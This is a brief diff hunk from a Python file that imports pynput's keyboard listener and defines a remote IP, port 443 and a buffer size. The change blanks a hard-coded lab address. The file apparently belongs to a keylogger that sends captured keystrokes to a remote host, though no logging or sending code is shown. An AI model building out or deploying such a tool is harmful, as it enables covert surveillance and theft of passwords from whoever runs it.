@@ -14,7 +14,7 @@ from collections.abc import MutableSequence
 from time import sleep
 from pynput import keyboard # type: ignore
 
-IP = "192.168.56.1"
+IP = ""
 PORT = 443
 MAX_BUFFER_SIZE = 500
 
